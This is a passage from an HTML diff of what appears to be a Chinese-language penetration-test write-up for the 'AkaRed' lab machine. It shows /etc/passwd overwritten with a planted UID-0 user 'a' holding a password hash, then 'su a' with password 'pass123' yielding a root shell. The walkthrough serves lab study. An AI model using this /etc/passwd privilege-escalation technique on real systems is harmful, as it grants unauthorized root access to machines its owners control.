 <p><strong>验证 <code class="notranslate">/etc/passwd</code> 内容</strong>:</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/tmp$ cat /etc/passwd
-a:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:root:/root:/bin/bash
-</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ cat /etc/passwd
+a:<span class="pl-smi">$1</span><span class="pl-smi">$user3$rAGRVf5p2jYTqtqOW5cPu</span>/:0:0:root:/root:/bin/bash</pre></div>
 <p>文件已被成功修改为只包含我们添加的 <code class="notranslate">a</code> 用户条目。</p>
 </li>
 </ol>
 <h3>4.5. 获取 Root 权限 (Gaining Root Access)</h3>
 <p>使用新添加的用户 <code class="notranslate">a</code> 和之前设置的密码（例如 'pass123'）进行登录。</p>
-<pre lang="bash" class="notranslate"><code class="notranslate">welcome@AkaRed:/tmp$ su a
-Password: &lt;输入 'pass123' 或对应哈希的密码&gt;
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@AkaRed:/tmp$ su a
+Password: <span class="pl-k">&lt;</span>输入 <span class="pl-s"><span class="pl-pds">'</span>pass123<span class="pl-pds">'</span></span> 或对应哈希的密码<span class="pl-k">&gt;</span>
 a@AkaRed:/tmp# id
 uid=0(a) gid=0(root) groups=0(root)
-```成功获取 root 权限。
-</code></pre>
+<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span>成功获取 root 权限。</span></pre></div>
 <h2>5. 总结 (Conclusion)</h2>
 <p>本次渗透测试通过以下步骤成功获取了 AkaRed 靶机的 root 权限：</p>
 <ol>
